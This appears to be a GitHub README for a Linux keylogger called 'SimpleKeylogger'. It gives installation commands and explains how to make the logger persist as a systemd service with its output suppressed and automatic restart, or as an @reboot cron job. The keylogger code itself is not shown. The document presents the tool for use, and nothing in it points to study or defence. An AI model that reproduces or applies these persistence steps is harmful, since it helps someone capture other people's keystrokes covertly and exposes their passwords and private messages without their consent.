# SimpleKeylogger

A linux keylogger written by @saucecan (https://www.github.com/saucecan).
This program should be run with elevated privileges and can be ran as a chron job or daemon to capture keystrokes.
Be sure to modify the path of the logfile.


## Installation

Install requirements
```
hansoho@hansoho.co:~$ git clone https://github.com/hansoh0/SimpleKeylogger.git
hansoho@hansoho.co:~$ sudo apt-get install coreutils python3 -y;sudo apt-get install pip -y
hansoho@hansoho.co:~$ pip install -r requirements.txt
```

## Execution Methods
You can run it as a service or cronjob
### Service
```
hansoho@hansoho.co:~$ sudo vi /etc/systemd/system/keylog.service

[Unit]
Description=Keylogger
After=network.target

[Service]
ExecStart=/usr/bin/python3 /path/to/simpleKeylog.py
WorkingDirectory=/path/to/simpleKeylogWorkingDir
StandardOutput=null
StandardError=null
Restart=always
User=user

[Install]
WantedBy=multi-user.target

hansoho@hansoho.co:~$ sudo systemctl daemon-reload
hansoho@hansoho.co:~$ sudo systemctl enable keylog.service
hansoho@hansoho.co:~$ sudo systemctl start keylog.service
```
### Crontab
```
hansoho@hansoho.co:~$ crontab -e

@reboot nohup /usr/bin/python3 /path/to/simpleKeylog.py &
```
Haven't tested on windows, GLHF

